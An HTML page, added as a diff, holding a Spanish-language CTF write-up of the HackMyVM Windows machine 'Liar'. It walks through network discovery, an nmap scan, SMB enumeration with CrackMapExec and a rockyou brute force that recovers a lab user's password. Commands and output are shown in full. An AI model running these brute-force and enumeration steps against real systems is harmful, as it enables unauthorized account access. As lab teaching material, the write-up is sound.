@@ -1,0 +1,738 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Liar (Windows) Writeup - Hacktivo.io</title>
+<meta name="description" content="Hola a todos, hoy les presentaré la resolución de una máquina HackMyVM de dificultad Easy. En esta máquina aprenderemos a enumerar y explotar el servicio SMB, y también a utilizar WinRM para obtener acceso remoto en el sistema Windows, una vez que tengamos las credenciales correctas.">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Hacktivo.io">
+<meta property="og:title" content="Liar (Windows) Writeup">
+<meta property="og:url" content="http://0.0.0.0:4000/HakckMyVM-Lia-easy/">
+
+
+  <meta property="og:description" content="Hola a todos, hoy les presentaré la resolución de una máquina HackMyVM de dificultad Easy. En esta máquina aprenderemos a enumerar y explotar el servicio SMB, y también a utilizar WinRM para obtener acceso remoto en el sistema Windows, una vez que tengamos las credenciales correctas.">
+
+
+
+  <meta property="og:image" content="http://0.0.0.0:4000/assets/images/2025-04-13-HackMyVM-Lia-easy/2.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2025-04-12T00:00:00+00:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://0.0.0.0:4000/HakckMyVM-Lia-easy/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "0x832",
+      "url": "http://0.0.0.0:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Hacktivo.io Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="stylesheet" href="/assets/css/portfolio.css?v=1783946214">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/0x832.png" alt=""></a>
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Inicio</a>
+            </li><li class="masthead__menu-item">
+              <a href="/#trabajo" >Trabajo</a>
+            </li><li class="masthead__menu-item">
+              <a href="/#especialidades" >Especialidades</a>
+            </li><li class="masthead__menu-item">
+              <a href="/explorar/" >Explorar</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://0.0.0.0:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Liar (Windows) Writeup</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="0x832" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">0x832</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Pentesting y programación
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/0x832" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Liar (Windows) Writeup">
+    <meta itemprop="description" content="Hola a todos, hoy les presentaré la resolución de una máquina HackMyVM de dificultad Easy. En esta máquina aprenderemos a enumerar y explotar el servicio SMB, y también a utilizar WinRM para obtener acceso remoto en el sistema Windows, una vez que tengamos las credenciales correctas.">
+    <meta itemprop="datePublished" content="April 12, 2025">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Liar (Windows) Writeup
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2025-04-12T00:00:00+00:00">April 12, 2025 </time>&emsp;
+          
+          
+        </p>
+        <p><img src="/assets/images/2025-04-13-HackMyVM-Lia-easy/2.png" alt="" /></p>
+
+<p>Hola a todos, hoy les presentaré la resolución de una máquina HackMyVM de dificultad Easy. En esta máquina aprenderemos a enumerar y explotar el servicio SMB, y también a utilizar WinRM para obtener acceso remoto en el sistema Windows, una vez que tengamos las credenciales correctas.
+<br /></p>
+
+<h2 id="reconocimiento-de-la-red-local">Reconocimiento de la Red Local</h2>
+
+<p>El primer paso será enumerar los dispositivos de la red para encontrar la máquina vulnerable.</p>
+
+<p>En este caso usaremos <strong>arp-scan</strong> con <code class="language-plaintext highlighter-rouge">-I</code> especificaremos la interfaz que queremos escanear y con el <code class="language-plaintext highlighter-rouge">ignoredups</code> ignoraremos las entradas duplicadas . Tambien con <code class="language-plaintext highlighter-rouge">2&gt;/dev/null</code> mandaremos los errores al <code class="language-plaintext highlighter-rouge">/dev/null</code> para que no sean visibles en la terminal. Por ultimo filtraremos por la mac que tenga <code class="language-plaintext highlighter-rouge">08:00:27</code> ya que este tipo de MAC son de la interfaz de red utilizadas por máquinas virtuales.</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="err">┌──</span><span class="p">(</span><span class="n">root</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="sr">/home/use</span><span class="n">r</span><span class="p">]</span>
+  <span class="err">└─</span><span class="c1"># arp-scan -I eth2 --localnet --ignoredups 2&gt;/dev/null | grep '08:00:27'      </span>
+
+  <span class="no">Interface</span><span class="p">:</span> <span class="n">eth2</span><span class="p">,</span> <span class="ss">type: </span><span class="no">EN10MB</span><span class="p">,</span> <span class="no">MAC</span><span class="p">:</span> <span class="mi">08</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mi">27</span><span class="ss">:db</span><span class="p">:</span><span class="mi">40</span><span class="p">:</span><span class="mi">5</span><span class="n">e</span><span class="p">,</span> <span class="no">IPv4</span><span class="p">:</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">56.101</span>
+  <span class="mf">192.168</span><span class="o">.</span><span class="mf">56.100</span>  <span class="mi">08</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">5</span><span class="n">d</span><span class="p">:</span><span class="mo">05</span><span class="ss">:f2</span>       <span class="p">(</span><span class="no">Unknown</span><span class="p">)</span>
+  <span class="mf">192.168</span><span class="o">.</span><span class="mf">56.102</span>  <span class="mi">08</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">53</span><span class="ss">:f6</span><span class="p">:</span><span class="mi">85</span>       <span class="p">(</span><span class="no">Unknown</span><span class="p">)</span>
+
+</code></pre></div></div>
+
+<h1 id="reconocimiento">Reconocimiento</h1>
+<ul>
+  <li>
+    <p>Enumeración con nmap
+  Hacemos un <code class="language-plaintext highlighter-rouge">nmap</code> simple para ver los puertos que corren en la máquina</p>
+
+    <div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1">#nmap -p- -sS --min-rate 5000 -T5 -Pn -vvv -oN ports.txt 192.168.56.102</span>
+    <span class="no">Warning</span><span class="p">:</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">56.102</span> <span class="n">giving</span> <span class="n">up</span> <span class="n">on</span> <span class="n">port</span> <span class="n">because</span> <span class="n">retransmission</span> <span class="n">cap</span> <span class="n">hit</span> <span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="o">.</span>
+    <span class="no">Increasing</span> <span class="nb">send</span> <span class="n">delay</span> <span class="k">for</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">56.102</span> <span class="n">from</span> <span class="mi">0</span> <span class="n">to</span> <span class="mi">5</span> <span class="n">due</span> <span class="n">to</span> <span class="mi">10452</span> <span class="n">out</span> <span class="n">of</span> <span class="mi">26129</span> <span class="n">dropped</span> <span class="n">probes</span> <span class="n">since</span> <span class="n">last</span> <span class="n">increase</span><span class="o">.</span>
+    <span class="no">Nmap</span> <span class="nb">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">56.102</span>
+    <span class="no">Host</span> <span class="n">is</span> <span class="n">up</span><span class="p">,</span> <span class="n">received</span> <span class="n">arp</span><span class="o">-</span><span class="n">response</span> <span class="p">(</span><span class="mf">0.0018</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
+    <span class="no">Scanned</span> <span class="n">at</span> <span class="mi">2025</span><span class="o">-</span><span class="mo">04</span><span class="o">-</span><span class="mi">13</span> <span class="mi">13</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="mi">49</span> <span class="no">CEST</span> <span class="k">for</span> <span class="mi">30</span><span class="n">s</span>
+    <span class="no">Not</span> <span class="ss">shown: </span><span class="mi">60297</span> <span class="n">closed</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">reset</span><span class="p">),</span> <span class="mi">5226</span> <span class="n">filtered</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">no</span><span class="o">-</span><span class="n">response</span><span class="p">)</span>
+    <span class="no">PORT</span>      <span class="no">STATE</span> <span class="no">SERVICE</span>      <span class="no">REASON</span>
+    <span class="mi">80</span><span class="o">/</span><span class="n">tcp</span>    <span class="nb">open</span>  <span class="n">http</span>         <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">128</span>
+    <span class="mi">135</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">msrpc</span>        <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">128</span>
+    <span class="mi">139</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span>  <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">128</span>
+    <span class="mi">445</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">microsoft</span><span class="o">-</span><span class="n">ds</span> <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">128</span>
+    <span class="mi">5985</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">wsman</span>        <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">128</span>
+    <span class="mi">47001</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">winrm</span>        <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">128</span>
+    <span class="mi">49664</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>      <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">128</span>
+    <span class="mi">49665</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>      <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">128</span>
+    <span class="mi">49666</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>      <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">128</span>
+    <span class="mi">49667</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>      <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">128</span>
+    <span class="mi">49668</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>      <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">128</span>
+    <span class="mi">49671</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>      <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">128</span>
+    <span class="no">MAC</span> <span class="no">Address</span><span class="p">:</span> <span class="mi">08</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">53</span><span class="ss">:F6</span><span class="p">:</span><span class="mi">85</span> <span class="p">(</span><span class="no">Oracle</span> <span class="no">VirtualBox</span> <span class="n">virtual</span> <span class="no">NIC</span><span class="p">)</span>
+
+    <span class="no">Read</span> <span class="n">data</span> <span class="n">files</span> <span class="ss">from: </span><span class="sr">/usr/</span><span class="n">bin</span><span class="o">/..</span><span class="sr">/share/nm</span><span class="n">ap</span>
+</code></pre></div>    </div>
+    <p>En este caso podemos ver bastantes puertos , pero los que más nos llaman la atención son el</p>
+    <div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="mi">80</span>	<span class="no">HTTP</span>	<span class="no">Servicio</span> <span class="n">web</span>
+    <span class="mi">135</span>	<span class="no">MSRPC</span>	<span class="no">Llamadas</span> <span class="n">remotas</span>
+    <span class="mi">139</span>	<span class="no">NetBIOS</span> <span class="no">Servicio</span> <span class="n">de</span> <span class="n">sesiones</span>
+    <span class="mi">445</span>	<span class="no">SMB</span>	<span class="no">Compartici</span><span class="err">ó</span><span class="n">n</span> <span class="n">de</span> <span class="n">archivos</span>
+    <span class="mi">5985</span>	<span class="no">WinRM</span>	<span class="no">PowerShell</span> <span class="n">remoto</span> <span class="n">v</span><span class="err">í</span><span class="n">a</span> <span class="no">HTTP</span>
+    <span class="mi">47001</span>	<span class="no">WinRM</span> <span class="p">(</span><span class="no">HTTPS</span><span class="p">)</span>	<span class="no">PowerShell</span> <span class="n">remoto</span> <span class="n">v</span><span class="err">í</span><span class="n">a</span> <span class="no">HTTPS</span>
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<h1 id="ahora-accedemos-a-la-web-para-poder-determinar-qué-tipo-de-vulnerabilidades-podemos-encontrar">Ahora accedemos a la web para poder determinar qué tipo de vulnerabilidades podemos encontrar</h1>
+<p>Vemos que hay algo que nos llama la atención <strong>nica</strong> (un usuario) 
+  <img src="/assets/images/2025-04-13-HackMyVM-Lia-easy/1.png" alt="Untitled" /></p>
+
+<h2 id="reconocimiento-smb">Reconocimiento SMB</h2>
+
+<p>Ya que tenemos el SMB habilitado podemos intentar hacer un ataque de fuerza bruta en el servidor SMB ya que tenemos un usuario posiblemente valido</p>
+
+<p>Primero haremos un reconocimiento para ver a qué nos enfrentamos</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="err">┌──</span><span class="p">(</span><span class="n">root</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="sr">/home/use</span><span class="n">r</span><span class="p">]</span>
+    <span class="err">└─</span><span class="c1"># creackmapexec smb 192.168.56.102</span>
+      <span class="no">SMB</span>   <span class="mf">192.168</span><span class="o">.</span><span class="mf">56.102</span>  <span class="mi">445</span>    <span class="no">WIN</span><span class="o">-</span><span class="no">IURF14RBVGV</span>  <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="no">Windows</span> <span class="mi">10</span> <span class="o">/</span> <span class="no">Server</span> <span class="mi">2019</span> <span class="no">Build</span> <span class="mi">17763</span> <span class="n">x64</span> <span class="p">(</span><span class="nb">name</span><span class="ss">:WIN</span><span class="o">-</span><span class="no">IURF14RBVGV</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="ss">:WIN</span><span class="o">-</span><span class="no">IURF14RBVGV</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="ss">:False</span><span class="p">)</span> <span class="p">(</span><span class="no">SMBv1</span><span class="ss">:False</span><span class="p">)</span>
+
+</code></pre></div></div>
+<p>Podemos observar cosas bastante interesantes como:</p>
+
+<p><strong>WIN-IURF14RBVGV</strong>	Nombre del host de la máquina (NetBIOS name).</p>
+
+<p><strong>(domain:WIN-IURF14RBVGV)</strong> No pertenece a un dominio externo, solo a su propio grupo de trabajo.</p>
+
+<p><strong>(signing:false)</strong>	La firma de paquetes SMB está desactivada, lo cual nos permite hacer, Fuerza bruta, Pass-the-Hash…</p>
+
+<h2 id="intento-de-session-nula-smb">Intento de session nula SMB</h2>
+
+<p>Podríamos intentar listar recursos con una sesión nula</p>
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="err">┌──</span><span class="p">(</span><span class="n">root</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="sr">/home/use</span><span class="n">r</span><span class="p">]</span>
+    <span class="err">└─</span><span class="c1"># crackmapexec smb 192.168.56.102 -u null -p '' --shares</span>
+      <span class="no">SMB</span>   <span class="mf">192.168</span><span class="o">.</span><span class="mf">56.102</span>  <span class="mi">445</span>    <span class="no">WIN</span><span class="o">-</span><span class="no">IURF14RBVGV</span>  <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="no">Windows</span> <span class="mi">10</span> <span class="o">/</span> <span class="no">Server</span> <span class="mi">2019</span> <span class="no">Build</span> <span class="mi">17763</span> <span class="n">x64</span> <span class="p">(</span><span class="nb">name</span><span class="ss">:WIN</span><span class="o">-</span><span class="no">IURF14RBVGV</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="ss">:WIN</span><span class="o">-</span><span class="no">IURF14RBVGV</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="ss">:False</span><span class="p">)</span> <span class="p">(</span><span class="no">SMBv1</span><span class="ss">:False</span><span class="p">)</span>
+
+    <span class="no">SMB</span>   <span class="mf">192.168</span><span class="o">.</span><span class="mf">56.102</span>  <span class="mi">445</span>    <span class="no">WIN</span><span class="o">-</span><span class="no">IURF14RBVGV</span>  <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="no">WIN</span><span class="o">-</span><span class="no">IURF14RBVGV</span><span class="p">\</span><span class="ss">null: </span><span class="no">STATUS_LOGON_FAILURE</span>
+</code></pre></div></div>
+<p>Por lo que podemos observar, listar recusos con session <strong>nula</strong> no deja</p>
+
+<h2 id="fuerza-bruta-al-recurso-smb-con-el-usuario-nica">Fuerza bruta al recurso SMB con el usuario “nica”</h2>
+
+<p>Una vez hecho esto , intentaremos hacer un ataque de fuerza bruta al recurso SMB con el usuario encontrado anteriormente <strong>nica</strong></p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="err">┌──</span><span class="p">(</span><span class="n">root</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="sr">/home/use</span><span class="n">r</span><span class="p">]</span>
+  <span class="err">└─</span><span class="c1"># crackmapexec smb 192.168.56.102 -u nica -p /usr/share/wordlists/rockyou.txt</span>
+    <span class="no">SMB</span>         <span class="mf">192.168</span><span class="o">.</span><span class="mf">56.102</span>  <span class="mi">445</span>    <span class="no">WIN</span><span class="o">-</span><span class="no">IURF14RBVGV</span>  <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="no">Windows</span> <span class="mi">10</span> <span class="o">/</span> <span class="no">Server</span> <span class="mi">2019</span> <span class="no">Build</span> <span class="mi">17763</span> <span class="n">x64</span> <span class="p">(</span><span class="nb">name</span><span class="ss">:WIN</span><span class="o">-</span><span class="no">IURF14RBVGV</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="ss">:WIN</span><span class="o">-</span><span class="no">IURF14RBVGV</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="ss">:False</span><span class="p">)</span> <span class="p">(</span><span class="no">SMBv1</span><span class="ss">:False</span><span class="p">)</span>
+    <span class="no">SMB</span>   <span class="mf">192.168</span><span class="o">.</span><span class="mf">56.102</span>  <span class="mi">445</span>    <span class="no">WIN</span><span class="o">-</span><span class="no">IURF14RBVGV</span>  <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="no">WIN</span><span class="o">-</span><span class="no">IURF14RBVGV</span><span class="p">\</span><span class="n">nica</span><span class="p">:</span><span class="mi">123456</span> <span class="no">STATUS_LOGON_FAILURE</span>
+    <span class="no">SMB</span>   <span class="mf">192.168</span><span class="o">.</span><span class="mf">56.102</span>  <span class="mi">445</span>    <span class="no">WIN</span><span class="o">-</span><span class="no">IURF14RBVGV</span>  <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="no">WIN</span><span class="o">-</span><span class="no">IURF14RBVGV</span><span class="p">\</span><span class="n">nica</span><span class="p">:</span><span class="mi">12345</span> <span class="no">STATUS_LOGON_FAILURE</span>
+    <span class="no">SMB</span>   <span class="mf">192.168</span><span class="o">.</span><span class="mf">56.102</span>  <span class="mi">445</span>    <span class="no">WIN</span><span class="o">-</span><span class="no">IURF14RBVGV</span>  <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="no">WIN</span><span class="o">-</span><span class="no">IURF14RBVGV</span><span class="p">\</span><span class="n">nica</span><span class="p">:</span><span class="mi">123456789</span> <span class="no">STATUS_LOGON_FAILURE</span>
+    <span class="no">SMB</span>   <span class="mf">192.168</span><span class="o">.</span><span class="mf">56.102</span>  <span class="mi">445</span>    <span class="no">WIN</span><span class="o">-</span><span class="no">IURF14RBVGV</span>  <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="no">WIN</span><span class="o">-</span><span class="no">IURF14RBVGV</span><span class="p">\</span><span class="n">nica</span><span class="ss">:password</span> <span class="no">STATUS_LOGON_FAILURE</span>
+    <span class="no">SMB</span>   <span class="mf">192.168</span><span class="o">.</span><span class="mf">56.102</span>  <span class="mi">445</span>    <span class="no">WIN</span><span class="o">-</span><span class="no">IURF14RBVGV</span>  <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="no">WIN</span><span class="o">-</span><span class="no">IURF14RBVGV</span><span class="p">\</span><span class="n">nica</span><span class="ss">:realizar</span> <span class="no">STATUS_LOGON_FAILURE</span>
+    <span class="no">SMB</span>   <span class="mf">192.168</span><span class="o">.</span><span class="mf">56.102</span>  <span class="mi">445</span>    <span class="no">WIN</span><span class="o">-</span><span class="no">IURF14RBVGV</span>  <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="no">WIN</span><span class="o">-</span><span class="no">IURF14RBVGV</span><span class="p">\</span><span class="n">nica</span><span class="ss">:h</span><span class="o">****</span>
+</code></pre></div></div>
+<p>Hemos obtenido la contraseña <code class="language-plaintext highlighter-rouge">h*****</code> despues de realizar el ataque de fuerza brut !</p>
+
+<h2 id="recursos-compartidos">Recursos compartidos</h2>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="err">┌──</span><span class="p">(</span><span class="n">root</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="sr">/home/use</span><span class="n">r</span><span class="p">]</span>
+    <span class="err">└─$</span> <span class="n">crackmapexec</span> <span class="n">smb</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">56.102</span> <span class="o">-</span><span class="n">u</span> <span class="n">nica</span> <span class="o">-</span><span class="nb">p</span> <span class="n">hardcore</span> <span class="o">--</span><span class="n">shares</span>
+    <span class="no">SMB</span>         <span class="mf">192.168</span><span class="o">.</span><span class="mf">56.102</span>   <span class="mi">445</span>    <span class="no">WIN</span><span class="o">-</span><span class="no">IURF14RBVGV</span>  <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="no">Windows</span> <span class="mi">10</span> <span class="o">/</span> <span class="no">Server</span> <span class="mi">2019</span> <span class="no">Build</span> <span class="mi">17763</span> <span class="n">x64</span> <span class="p">(</span><span class="nb">name</span><span class="ss">:WIN</span><span class="o">-</span><span class="no">IURF14RBVGV</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="ss">:WIN</span><span class="o">-</span><span class="no">IURF14RBVGV</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="ss">:False</span><span class="p">)</span> <span class="p">(</span><span class="no">SMBv1</span><span class="ss">:False</span><span class="p">)</span>
+
+    <span class="no">SMB</span>   <span class="mf">192.168</span><span class="o">.</span><span class="mf">56.102</span>   <span class="mi">445</span>    <span class="no">WIN</span><span class="o">-</span><span class="no">IURF14RBVGV</span>  <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="no">WIN</span><span class="o">-</span><span class="no">IURF14RBVGV</span><span class="p">\</span><span class="n">nica</span><span class="ss">:hardcore</span>
+    <span class="no">SMB</span>   <span class="mf">192.168</span><span class="o">.</span><span class="mf">56.102</span>   <span class="mi">445</span>    <span class="no">WIN</span><span class="o">-</span><span class="no">IURF14RBVGV</span>  <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="no">Enumerated</span> <span class="n">shares</span>
+    <span class="no">SMB</span>   <span class="mf">192.168</span><span class="o">.</span><span class="mf">56.102</span>   <span class="mi">445</span>    <span class="no">WIN</span><span class="o">-</span><span class="no">IURF14RBVGV</span>  <span class="no">Share</span>     <span class="no">Permissions</span>     <span class="no">Remark</span>
+    <span class="no">SMB</span>   <span class="mf">192.168</span><span class="o">.</span><span class="mf">56.102</span>   <span class="mi">445</span>    <span class="no">WIN</span><span class="o">-</span><span class="no">IURF14RBVGV</span>  <span class="o">-----</span>     <span class="o">-----------</span>     <span class="o">------</span>
+    <span class="no">SMB</span>   <span class="mf">192.168</span><span class="o">.</span><span class="mf">56.102</span>   <span class="mi">445</span>    <span class="no">WIN</span><span class="o">-</span><span class="no">IURF14RBVGV</span>  <span class="no">ADMIN</span><span class="err">$</span>              <span class="no">Admin</span> <span class="n">remota</span>
+    <span class="no">SMB</span>   <span class="mf">192.168</span><span class="o">.</span><span class="mf">56.102</span>   <span class="mi">445</span>    <span class="no">WIN</span><span class="o">-</span><span class="no">IURF14RBVGV</span>  <span class="no">C</span><span class="err">$</span>            <span class="no">Recurso</span> <span class="n">predeterminado</span>
+    <span class="no">SMB</span>   <span class="mf">192.168</span><span class="o">.</span><span class="mf">56.102</span>   <span class="mi">445</span>    <span class="no">WIN</span><span class="o">-</span><span class="no">IURF14RBVGV</span>  <span class="no">IPC</span><span class="err">$</span>            <span class="no">READ</span>            <span class="no">IPC</span> <span class="n">remota</span>
+</code></pre></div></div>
+
+<h3 id="vemnos-que-hay-varios-recursos-compartidos">Vemnos que hay varios recursos compartidos</h3>
+
+<p><strong>1. ADMIN$:</strong> Recurso para administración remota (por defecto, los administradores pueden acceder a él).</p>
+
+<p><strong>2. C$:</strong> Recurso predeterminado que da acceso a la unidad C del sistema</p>
+
+<p><strong>3. IPC$:</strong>  proporciona un mecanismo de comunicación entre procesos (IPC) autenticado .Permite realizar conexiones remotas con otros servicios, pero tiene permisos de solo lectura.</p>
+
+<p>Veremos los recursos compartidos por defecto, por lo que no nos sirve de mucho, pero vamos a probar a conectarnos de forma remota con las credenciales que hemos encontrado, mediante el protocolo <strong>WinRM</strong>.</p>
+
+<h1 id="winrm-windows-remote-management">WinRM (Windows Remote Management)</h1>
+
